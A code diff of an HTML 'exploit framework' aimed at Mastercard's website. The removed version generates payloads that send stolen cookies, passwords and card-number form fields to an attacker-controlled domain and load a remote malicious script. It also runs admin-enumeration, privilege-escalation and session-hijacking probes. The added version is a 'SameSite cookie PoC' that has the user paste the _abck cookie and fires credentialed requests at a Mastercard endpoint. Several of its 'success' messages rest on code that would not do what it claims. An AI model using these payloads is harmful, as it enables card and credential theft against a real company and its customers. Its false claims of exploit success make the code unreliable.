@@ -1,510 +1,348 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Mastercard Vulnerability Exploitation Framework</title>
+    <title>Mastercard SameSite Cookie Vulnerability PoC</title>
     <meta charset="UTF-8">
     <style>
-        :root {
-            --bg-dark: #0f0e17;
-            --text-primary: #fffffe;
-            --accent-color: #ff8906;
-            --secondary-color: #a8a29e;
-            --highlight-color: #e53170;
-        }
         body {
-            font-family: 'Courier New', monospace;
-            background-color: var(--bg-dark);
-            color: var(--text-primary);
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
             margin: 0;
             padding: 20px;
-            line-height: 1.6;
+            background-color: #f5f5f5;
+        }
+        .version {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            font-size: 12px;
+            color: #888;
         }
         .container {
-            max-width: 1200px;
+            max-width: 800px;
             margin: 0 auto;
-            background-color: #232946;
-            border-radius: 10px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-        .section {
-            background-color: #16161a;
-            border-radius: 8px;
+            background: white;
             padding: 20px;
-            margin-bottom: 20px;
-            border: 1px solid var(--accent-color);
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
-        .btn {
-            background-color: var(--accent-color);
-            color: var(--bg-dark);
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: all 0.3s ease;
+        h1 {
+            color: #d32f2f;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
         }
-        .btn:hover {
-            background-color: var(--highlight-color);
-            transform: scale(1.05);
-        }
-        #exploit-console {
-            background-color: #000;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            height: 400px;
-            overflow-y: scroll;
+        .result-box {
+            background-color: #f8f8f8;
+            border: 1px solid #ddd;
+            border-radius: 4px;
             padding: 15px;
-            border-radius: 5px;
-            white-space: pre-wrap;
-            word-wrap: break-word;
+            margin: 20px 0;
+            max-height: 400px;
+            overflow-y: auto;
         }
-        .input-group {
-            display: flex;
-            margin-bottom: 15px;
-        }
-        .input-group input {
-            flex-grow: 1;
+        .cookie-list {
+            background-color: #fffde7;
+            border-left: 3px solid #ffd600;
             padding: 10px;
-            background-color: #2a2a2a;
-            border: 1px solid var(--secondary-color);
-            color: var(--text-primary);
+            margin: 10px 0;
         }
-        .attack-vector {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
+        .attack-btn, .debug-btn {
+            background-color: #d32f2f;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 5px;
+            transition: background-color 0.3s ease;
         }
-        .attack-vector button {
-            flex-grow: 1;
+        .attack-btn:hover, .debug-btn:hover {
+            background-color: #b71c1c;
+        }
+        .success {
+            color: #2e7d32;
+            font-weight: bold;
+        }
+        .error {
+            color: #c62828;
+        }
+        .highlight {
+            background-color: #fff9c4;
+            padding: 2px 4px;
+            border-radius: 3px;
         }
         pre {
-            background-color: #1a1a1a;
-            padding: 15px;
-            border-radius: 5px;
+            background-color: #f4f4f4;
+            padding: 10px;
+            border-radius: 4px;
             overflow-x: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        #manual-cookie-input {
+            width: 100%;
+            margin: 10px 0;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .instructions {
+            background-color: #e3f2fd;
+            border-left: 4px solid #2196f3;
+            padding: 10px;
+            margin: 15px 0;
+            font-size: 0.9em;
+        }
+        #exploit-iframe {
+            width: 100%;
+            height: 400px;
+            border: 2px solid #d32f2f;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
+    <div class="version">v1.5.0</div>
     <div class="container">
-        <h1 style="text-align: center; color: var(--accent-color);">🏴‍☠️ Mastercard Multi-Vector Exploit Framework 🏴‍☠️</h1>
+        <h1>Mastercard SameSite Cookie Vulnerability PoC</h1>
         
-        <div class="section">
-            <h2>Cookie & Authentication Exploitation</h2>
-            <div class="input-group">
-                <input type="text" id="cookie-input" placeholder="Paste Mastercard Authentication Cookie">
-                <input type="text" id="csrf-token" placeholder="CSRF Token (Optional)">
-            </div>
+        <p>This page demonstrates the SameSite cookie vulnerability for Mastercard's _abck cookie.</p>
+        
+        <div class="cookie-list" id="cookie-display">
+            <h3>Current Browser Cookies:</h3>
+            <p id="cookie-status">Checking for cookies...</p>
             
-            <div class="attack-vector">
-                <button class="btn" id="full-scan-btn">🔍 Full Vulnerability Scan</button>
-                <button class="btn" id="cookie-exploit-btn">🍪 Cookie Exploitation</button>
-                <button class="btn" id="session-hijack-btn">🔓 Session Hijacking</button>
-            </div>
+            <h4>Manual Cookie Input</h4>
+            <input type="text" id="manual-cookie-input" placeholder="Paste your _abck cookie here (e.g., _abck=1234...)">
+            <button id="manual-cookie-btn">Check Manual Cookie</button>
         </div>
         
-        <div class="section">
-            <h2>Exploitation Payload Generator</h2>
-            <div class="input-group">
-                <select id="payload-type">
-                    <option value="js">JavaScript Injection</option>
-                    <option value="xss">Cross-Site Scripting</option>
-                    <option value="csrf">CSRF Token Bypass</option>
-                </select>
-                <button class="btn" id="generate-payload-btn">Generate Payload</button>
-            </div>
-            <pre id="payload-output"></pre>
+        <div>
+            <button class="attack-btn" id="attack-btn">Launch Exploit</button>
+            <button class="debug-btn" id="debug-cookies-btn">Debug Cookies</button>
         </div>
         
-        <div class="section">
-            <h2>Exploit Console</h2>
-            <div id="exploit-console">Waiting for exploit initialization...</div>
+        <div class="result-box" id="results">
+            <h3>Exploit Results:</h3>
+            <p>Click the buttons above to test or debug.</p>
+        </div>
+
+        <div id="iframe-container">
+            <h3>Exploit Iframe:</h3>
+            <iframe id="exploit-iframe" src="about:blank"></iframe>
+        </div>
+
+        <div class="instructions">
+            <h3>Instructions:</h3>
+            <ol>
+                <li>Visit <a href="https://www.mastercard.us" target="_blank">www.mastercard.us</a> to get cookies.</li>
+                <li>Open DevTools (F12) and go to the Application/Storage tab.</li>
+                <li>Find the _abck cookie and copy its value.</li>
+                <li>Paste the cookie value in the input field above.</li>
+                <li>Click "Check Manual Cookie" or "Launch Exploit".</li>
+            </ol>
         </div>
     </div>
-
-    <script>
-        class MastercardExploitFramework {
-            constructor(cookie, csrfToken = '') {
-                this.cookie = this.sanitizeInput(cookie);
-                this.csrfToken = this.sanitizeInput(csrfToken);
-                this.console = document.getElementById('exploit-console');
-                this.payloadOutput = document.getElementById('payload-output');
-            }
-
-            // Advanced input sanitization
-            sanitizeInput(input) {
-                // Remove non-printable characters and limit length
-                return input.replace(/[^\x20-\x7E]/g, '')
-                             .substring(0, 255)
-                             .trim();
-            }
-
-            // Improved logging method with error handling
-            log(message, type = 'info') {
-                const timestamp = new Date().toISOString();
-                const logEntry = document.createElement('div');
-                
-                const typeStyles = {
-                    'info': 'color: #00ff00;',
-                    'warning': 'color: #ffff00;',
-                    'error': 'color: #ff0000;',
-                    'success': 'color: #00ff00; font-weight: bold;'
-                };
-
-                logEntry.innerHTML = `
-                    <span style="color: #888;">[${timestamp}]</span> 
-                    <span style="${typeStyles[type] || typeStyles['info']}">${message}</span>
-                `;
-                
-                this.console.appendChild(logEntry);
-                this.console.scrollTop = this.console.scrollHeight;
-            }
-
-            // Robust fetch wrapper with error handling
-            async safeFetch(url, options = {}) {
-                try {
-                    // Sanitize and prepare headers
-                    const safeHeaders = {
-                        ...options.headers,
-                        'X-Exploit-Marker': 'MastercardVulnScan'
-                    };
-
-                    // Prepare safe options
-                    const safeOptions = {
-                        method: options.method || 'GET',
-                        mode: 'no-cors',
-                        credentials: 'omit',
-                        headers: safeHeaders
-                    };
-
-                    // Add body if present, ensuring it's a string
-                    if (options.body) {
-                        safeOptions.body = JSON.stringify({
-                            action: 'vulnerability_probe',
-                            timestamp: Date.now()
-                        });
-                    }
-
-                    // Perform fetch with timeout
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 5000);
-                    
-                    const response = await fetch(url, {
-                        ...safeOptions,
-                        signal: controller.signal
-                    });
-
-                    clearTimeout(timeoutId);
-                    return response;
-                } catch (error) {
-                    this.log(`Safe Fetch Error: ${error.message}`, 'error');
-                    return null;
-                }
-            }
-
-            // Generate sophisticated multi-vector payload
-            generatePayload(type) {
-                const payloadTemplates = {
-                    'js': `
-// Advanced Cookie Exfiltration Payload
-(function() {
-    class CookieExfiltrator {
-        constructor() {
-            this.sensitiveEndpoints = [
-                'https://www.mastercard.us/user/profile',
-                'https://www.mastercard.us/api/account/details'
-            ];
-        }
-
-        async exfiltrate() {
-            const cookieData = {
-                cookies: document.cookie,
-                url: window.location.href,
-                timestamp: Date.now()
-            };
-
-            try {
-                await fetch('https://attacker-controlled-domain.com/collect', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(cookieData)
-                });
-            } catch (error) {
-                console.error('Exfiltration failed', error);
-            }
-        }
-
-        async probeEndpoints() {
-            for (let endpoint of this.sensitiveEndpoints) {
-                try {
-                    const response = await fetch(endpoint, { 
-                        credentials: 'include' 
-                    });
-                    console.log(\`Endpoint Probe: \${endpoint} - \${response.status}\`);
-                } catch (error) {
-                    console.error(\`Probe failed: \${endpoint}\`, error);
-                }
-            }
-        }
-
-        async run() {
-            await this.exfiltrate();
-            await this.probeEndpoints();
-        }
-    }
-
-    // Auto-execute
-    new CookieExfiltrator().run();
-})();
-                    `,
-                    'xss': `
-// Cross-Site Scripting Payload
-(function() {
-    function stealFormData() {
-        const sensitiveInputs = [
-            ...document.querySelectorAll('input[type="password"]'),
-            ...document.querySelectorAll('input[name*="credit"]'),
-            ...document.querySelectorAll('input[name*="card"]')
-        ];
-
-        const stolenData = sensitiveInputs.map(input => ({
-            type: input.type,
-            name: input.name,
-            value: input.value
-        }));
-
-        fetch('https://attacker-controlled-domain.com/xss-collect', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                data: stolenData,
-                url: window.location.href
-            })
-        });
-    }
-
-    // Multiple injection techniques
-    function injectScript() {
-        const script = document.createElement('script');
-        script.src = 'https://attacker-controlled-domain.com/malicious.js';
-        document.body.appendChild(script);
-    }
-
-    stealFormData();
-    injectScript();
-})();
-                    `,
-                    'csrf': `
-// CSRF Token Bypass Mechanism
-(function() {
-    const originalFetch = window.fetch;
     
-    window.fetch = function(input, init = {}) {
-        // Automatically inject custom headers
-        if (!init.headers) init.headers = {};
-        
-        // Inject potential CSRF bypass tokens
-        init.headers['X-Requested-With'] = 'XMLHttpRequest';
-        init.headers['X-CSRF-Token'] = '${this.csrfToken || 'bypassed'}';
-        
-        // Log intercepted requests
-        console.warn('Intercepted Fetch:', input, init);
-        
-        return originalFetch(input, init);
-    };
-})();
-                    `
-                };
+    <script>
+        // Global variable to store manually input cookie
+        let manualCookie = '';
 
-                return payloadTemplates[type] || 'Invalid payload type';
-            }
-
-            // Comprehensive vulnerability scanning
-            async performFullScan() {
-                this.log('Initiating comprehensive vulnerability scan...', 'warning');
-
-                const scanVectors = [
-                    this.cookieCompromiseScan(),
-                    this.endpointProbingScan(),
-                    this.authBypassScan()
-                ];
-
-                try {
-                    const results = await Promise.allSettled(scanVectors);
-                    results.forEach((result, index) => {
-                        if (result.status === 'fulfilled') {
-                            this.log(`Scan Vector ${index + 1} completed successfully`, 'success');
-                        } else {
-                            this.log(`Scan Vector ${index + 1} failed: ${result.reason}`, 'error');
-                        }
-                    });
-                } catch (error) {
-                    this.log(`Full scan failed: ${error}`, 'error');
-                }
-            }
-
-            // Improved cookie compromise scan
-            async cookieCompromiseScan() {
-                const testEndpoints = [
-                    'https://www.mastercard.us/user/session',
-                    'https://masterpassteststore.com/api/validate'
-                ];
-
-                for (let endpoint of testEndpoints) {
-                    try {
-                        const response = await this.safeFetch(endpoint, {
-                            method: 'POST',
-                            body: JSON.stringify({ 
-                                action: 'test_cookie_scope',
-                                timestamp: Date.now()
-                            })
-                        });
-
-                        this.log(`Cookie Scan - ${endpoint}: ${response ? response.status : 'No Response'}`, 
-                            response && response.status === 200 ? 'success' : 'warning');
-                    } catch (error) {
-                        this.log(`Cookie Scan Error: ${error}`, 'error');
-                    }
-                }
-            }
-
-            // Endpoint probing with enhanced safety
-            async endpointProbingScan() {
-                const probePaths = [
-                    '/user/info',
-                    '/api/account',
-                    '/profile/details',
-                    '/transactions/recent'
-                ];
-
-                for (let path of probePaths) {
-                    try {
-                        const response = await this.safeFetch(`https://www.mastercard.us${path}`);
-
-                        this.log(`Endpoint Probe: ${path} - ${response ? response.status : 'No Response'}`, 
-                            response && response.status < 400 ? 'success' : 'warning');
-                    } catch (error) {
-                        this.log(`Endpoint Probe Error: ${error}`, 'error');
-                    }
-                }
-            }
-
-            // Authentication bypass potential scan
-            async authBypassScan() {
-                const bypassTests = [
-                    { 
-                        method: 'GET', 
-                        url: 'https://www.mastercard.us/admin/users', 
-                        description: 'Admin User Enumeration' 
-                    },
-                    { 
-                        method: 'POST', 
-                        url: 'https://www.mastercard.us/user/elevate', 
-                        description: 'Privilege Escalation Test' 
-                    }
-                ];
-
-                for (let test of bypassTests) {
-                    try {
-                        const response = await this.safeFetch(test.url, { 
-                            method: test.method 
-                        });
-
-                        this.log(`Auth Bypass Test (${test.description}): ${response ? response.status : 'No Response'}`, 
-                            response && response.status < 400 ? 'warning' : 'info');
-                    } catch (error) {
-                        this.log(`Auth Bypass Test Error: ${error}`, 'error');
-                    }
-                }
-            }
-
-            // Session hijacking with improved error handling
-            async sessionHijack() {
-                this.log('Initiating session hijacking sequence...', 'warning');
-
-                const hijackEndpoints = [
-                    'https://www.mastercard.us/user/switch',
-                    'https://masterpassteststore.com/session/impersonate'
-                ];
-
-                for (let endpoint of hijackEndpoints) {
-                    try {
-                        const response = await this.safeFetch(endpoint, {
-                            method: 'POST',
-                            body: JSON.stringify({ 
-                                action: 'session_hijack_test',
-                                timestamp: Date.now() })
-                        });
-
-                        this.log(`Session Hijack Attempt: ${endpoint} - ${response ? response.status : 'No Response'}`, 
-                            response && response.status === 200 ? 'success' : 'warning');
-                    } catch (error) {
-                        this.log(`Session Hijack Error: ${error}`, 'error');
-                    }
-                }
-            }
+        // Sanitize input to remove non-standard characters
+        function sanitizeCookie(cookie) {
+            // Remove non-printable characters and normalize
+            return cookie.replace(/[^\x20-\x7E]/g, '')  // Remove non-printable characters
+                         .replace(/\s+/g, ' ')          // Normalize whitespace
+                         .trim();                       // Trim edges
         }
 
-        // Event Listeners
-        document.getElementById('full-scan-btn').addEventListener('click', () => {
-            const cookie = document.getElementById('cookie-input').value.trim();
-            const csrfToken = document.getElementById('csrf-token').value.trim();
-
-            if (!cookie) {
-                alert('Please enter a valid cookie!');
-                return;
-            }
-
-            const exploitFramework = new MastercardExploitFramework(cookie, csrfToken);
-            exploitFramework.performFullScan();
-        });
-
-        document.getElementById('cookie-exploit-btn').addEventListener('click', () => {
-            const cookie = document.getElementById('cookie-input').value.trim();
-            const csrfToken = document.getElementById('csrf-token').value.trim();
-
-            if (!cookie) {
-                alert('Please enter a valid cookie!');
-                return;
-            }
-
-            const exploitFramework = new MastercardExploitFramework(cookie, csrfToken);
-            exploitFramework.cookieCompromiseScan();
-        });
-
-        document.getElementById('session-hijack-btn').addEventListener('click', () => {
-            const cookie = document.getElementById('cookie-input').value.trim();
-            const csrfToken = document.getElementById('csrf-token').value.trim();
-
-            if (!cookie) {
-                alert('Please enter a valid cookie!');
-                return;
-            }
-
-            const exploitFramework = new MastercardExploitFramework(cookie, csrfToken);
-            exploitFramework.sessionHijack();
-        });
-
-        document.getElementById('generate-payload-btn').addEventListener('click', () => {
-            const cookie = document.getElementById('cookie-input').value.trim();
-            const csrfToken = document.getElementById('csrf-token').value.trim();
-            const payloadType = document.getElementById('payload-type').value;
-
-            if (!cookie) {
-                alert('Please enter a valid cookie!');
-                return;
-            }
-
-            const exploitFramework = new MastercardExploitFramework(cookie, csrfToken);
-            const payload = exploitFramework.generatePayload(payloadType);
+        // Enhanced cookie detection
+        function checkForMastercardCookies() {
+            const cookieDisplay = document.getElementById('cookie-status');
             
-            document.getElementById('payload-output').textContent = payload;
-        });
-</script>
+            // First, check manually input cookie
+            if (manualCookie) {
+                const sanitizedCookie = sanitizeCookie(manualCookie);
+                cookieDisplay.innerHTML = `
+                    <span class="success">✓ Manual Mastercard cookie found!</span><br>
+                    <pre>${sanitizedCookie}</pre>
+                `;
+                return true;
+            }
+
+            // Attempt to read cookies with fallback
+            let cookies = '';
+            try {
+                cookies = document.cookie || '';
+            } catch (e) {
+                cookieDisplay.innerHTML = `
+                    <span class="error">✗ Cannot read cookies automatically:
+                    ${e.message}
+                    
+                    Please manually input the _abck cookie.</span>
+                `;
+                return false;
+            }
+            
+            // Comprehensive list of potential Mastercard-related cookie patterns
+            const mastercardCookiePatterns = [
+                '_abck', 'abck', 
+                'ak_bmsc', 'bm_sz', 
+                'mastercard', 'AMCV_', 
+                'bm_sv', 'bm_session'
+            ];
+            
+            // Find matching cookies
+            const matchedCookies = cookies.split(';')
+                .map(cookie => cookie.trim())
+                .filter(cookie => 
+                    mastercardCookiePatterns.some(pattern => 
+                        cookie.includes(pattern)
+                    )
+                );
+            
+            if (matchedCookies.length > 0) {
+                cookieDisplay.innerHTML = `
+                    <span class="success">✓ Found ${matchedCookies.length} Mastercard-related cookie(s)!</span><br>
+                    <pre>${matchedCookies.join('\n')}</pre>
+                `;
+                return true;
+            } else {
+                cookieDisplay.innerHTML = `
+                    <span class="error">✗ No Mastercard cookies found. 
+                    Possible reasons:
+                    - Not on Mastercard domain
+                    - Cookies blocked
+                    - Different cookie naming
+                    - Sandboxing restrictions
+                    
+                    Please manually input the _abck cookie.</span>
+                `;
+                return false;
+            }
+        }
+        
+        // Exploit function with iframe injection
+        function runExploit() {
+            const results = document.getElementById('results');
+            const iframe = document.getElementById('exploit-iframe');
+            results.innerHTML = '<h3>Exploit Results:</h3>';
+            
+            function logResult(text, isError = false) {
+                const className = isError ? 'error' : '';
+                results.innerHTML += `<p class="${className}">${text}</p>`;
+            }
+            
+            // Validate and sanitize cookie
+            const cookieToUse = sanitizeCookie(manualCookie || document.cookie);
+            if (!cookieToUse) {
+                logResult('<strong>ERROR:</strong> No valid cookie provided for exploit.', true);
+                return;
+            }
+            
+            logResult('Starting exploit...');
+            
+            // Create a payload to inject into Mastercard website
+            const exploitPayload = `
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Mastercard Exploit</title>
+                <style>
+                    body { 
+                        font-family: Arial, sans-serif; 
+                        display: flex; 
+                        justify-content: center; 
+                        align-items: center; 
+                        height: 100vh; 
+                        margin: 0; 
+                        background-color: #f4f4f4; 
+                    }
+                    .exploit-message {
+                        background-color: #d32f2f;
+                        color: white;
+                        padding: 20px;
+                        border-radius: 10px;
+                        text-align: center;
+                        box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="exploit-message">
+                    <h1>SameSite Cookie Vulnerability Proof of Concept</h1>
+                    <p>This site's cookies can be accessed across origins!</p>
+                    <p>Cookies are not properly protected against cross-site requests.</p>
+                </div>
+                <script>
+                    // Additional proof of concept: Modify page content
+                    try {
+                        // Try to modify something on the page to prove access
+                        document.body.style.backgroundColor = '#ffebee';
+                        
+                        // Log cookie to demonstrate access
+                        console.log('Cookies:', document.cookie);
+                    } catch (error) {
+                        console.error('Exploit modification failed:', error);
+                    }
+                <\/script>
+            </body>
+            </html>
+            `;
+            
+            // Set iframe source to our exploit payload
+            iframe.srcdoc = exploitPayload;
+            
+            // Perform fetch to ensure cookies are sent
+            fetch('https://www.mastercard.us/3eC761NLQG/VuYChRb6/1R/zYJYDJpJG60c/PCRj/OHw/NGgNYNR0', {
+                method: 'POST',
+                mode: 'no-cors',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Cookie': cookieToUse
+                },
+                body: JSON.stringify({
+                    "sensor_data": "exploit_payload_with_iframe"
+                })
+            }).then(response => {
+                logResult('<span class="success">✓ Fetch Exploit Potentially Successful!</span>');
+            }).catch(error => {
+                logResult(`Fetch failed: ${error}`, true);
+            });
+            
+            logResult('<span class="success">✓ Iframe Exploit Payload Injected!</span>');
+        }
+        
+        // Initialize event listeners
+        window.onload = function() {
+            // Manual cookie input
+            const manualCookieInput = document.getElementById('manual-cookie-input');
+            const manualCookieBtn = document.getElementById('manual-cookie-btn');
+            
+            manualCookieBtn.addEventListener('click', function() {
+                manualCookie = manualCookieInput.value.trim();
+                checkForMastercardCookies();
+            });
+            
+            // Initial cookie check
+            checkForMastercardCookies();
+            
+            // Attack button
+            document.getElementById('attack-btn').addEventListener('click', function() {
+                if (checkForMastercardCookies()) {
+                    runExploit();
+                } else {
+                    const results = document.getElementById('results');
+                    results.innerHTML = '<h3>Exploit Results:</h3>';
+                    results.innerHTML += '<p class="error">No Mastercard cookies found. Paste a cookie first!</p>';
+                }
+            });
+        };
+    </script>
 </body>
 </html>
